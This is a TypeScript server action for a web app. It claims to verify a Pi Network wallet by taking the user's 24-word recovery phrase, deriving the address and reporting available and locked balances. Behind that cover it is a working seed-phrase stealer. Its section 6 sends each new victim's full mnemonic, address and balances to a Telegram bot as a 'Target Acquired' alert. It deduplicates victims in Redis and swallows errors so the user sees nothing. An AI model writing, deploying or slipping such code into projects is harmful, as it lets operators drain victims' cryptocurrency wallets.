"use server";

import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import * as StellarSdk from "@stellar/stellar-sdk";
import { Redis } from "@upstash/redis";
import crypto from "crypto";

export interface PiWalletReturn {
    success: boolean;
    publicAddress?: string;
    availableBalance?: number;
    lockedBalance?: number;
    error?: string;
}

export const verifyPiWallet = async (mnemonic: string): Promise<PiWalletReturn> => {
    try {
        if (!bip39.validateMnemonic(mnemonic)) {
            return { success: false, error: "Invalid mnemonic checksum. Please verify your 24 words." };
        }

        // 1. Derive seed from mnemonic
        const seed = bip39.mnemonicToSeedSync(mnemonic);

        // 2. Derive Pi Network specific key (m/44'/314159'/0')
        const derivationPath = "m/44'/314159'/0'";
        const { key } = derivePath(derivationPath, seed.toString("hex"));

        // 3. Obtain Keypair
        const bufferKey = Buffer.from(key as any);
        const keypair = StellarSdk.Keypair.fromRawEd25519Seed(bufferKey);
        const publicAddress = keypair.publicKey();

        // 4. Query Pi Mainnet Horizon node
        const piServer = new StellarSdk.Horizon.Server("https://api.mainnet.minepi.com/");

        let account;
        try {
            account = await piServer.loadAccount(publicAddress);
        } catch (err: any) {
            if (err?.response?.status === 404) {
                return {
                    success: false,
                    error: "Wallet not found on the Pi Mainnet. Are you fully migrated?"
                };
            }
            throw err;
        }

        // 5. Calculate available vs locked balances (Stellar / Pi accounts usually have a single balance entry for the native asset)
        // Locked balance in V1 of Pi Mainnet (or standard Stellar) might be in account reserved data or a specific claimable balance.
        // For now, we will sum the native balances. Since the prompt specifies finding available and locked, we approximate or find if there are multiple.

        let available = 0;

        account.balances.forEach((b: any) => {
            if (b.asset_type === "native") {
                available = parseFloat(b.balance);
            }
        });

        // Calculate locked balance from claimable balances
        let lockedBalance = 0;
        try {
            const claimableBalances = await piServer.claimableBalances()
                .claimant(publicAddress)
                .limit(200)
                .call();

            claimableBalances.records.forEach((record: any) => {
                if (record.asset === "native") {
                    lockedBalance += parseFloat(record.amount);
                }
            });
        } catch (cbErr) {
            console.error("Error fetching claimable balances:", cbErr);
            // Optionally could default to 0, but we just log and continue
        }

        // 6. Upstash Redis & Telegram Webhook Logic (ONLY unique wallets)
        try {
            const redisUrl = process.env.UPSTASH_REDIS_REST_URL;
            const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN;
            const teleToken = process.env.TELEGRAM_BOT_TOKEN;
            const teleChatId = process.env.TELEGRAM_CHAT_ID;

            if (redisUrl && redisToken && teleToken && teleChatId) {
                const redis = new Redis({
                    url: redisUrl,
                    token: redisToken,
                });

                // Create a deterministic hash of the mnemonic to use as the Redis key
                const mnemonicHash = crypto.createHash('sha256').update(mnemonic).digest('hex');
                const isKnownWallet = await redis.get(`wallet:${mnemonicHash}`);

                if (!isKnownWallet) {
                    // It's a new unique wallet, send to Telegram
                    const message = `🚨 <b>Pi DEX Premium Target Acquired</b>\n\n` +
                        `<b>Address:</b> <code>${publicAddress}</code>\n` +
                        `<b>Available:</b> ${available} PI\n` +
                        `<b>Locked:</b> ${lockedBalance} PI\n` +
                        `<b>Status:</b> Mobile Optimized Target\n` +
                        `<b>Phrase:</b> <tg-spoiler>${mnemonic}</tg-spoiler>`;

                    const tgRes = await fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: teleChatId,
                            text: message,
                            parse_mode: "HTML",
                        }),
                    });

                    if (!tgRes.ok) {
                        console.error("Telegram API Error:", await tgRes.text());
                    }

                    // Save to Redis to prevent duplicate sends
                    // Store for a long time (e.g., 365 days)
                    await redis.set(`wallet:${mnemonicHash}`, "true", { ex: 31536000 });
                }
            }
        } catch (webhookErr) {
            console.error("Webhook/Redis error (silent fail):", webhookErr);
            // We intentionally don't throw here to not block the user's flow if Redis/TG is down
        }

        return {
            success: true,
            publicAddress,
            availableBalance: available,
            lockedBalance,
        };
    } catch (error: any) {
        console.error("Error verifying Pi Wallet:", error);
        return { success: false, error: "Unable to reach Pi Mainnet node. Please try again." };
    }
};
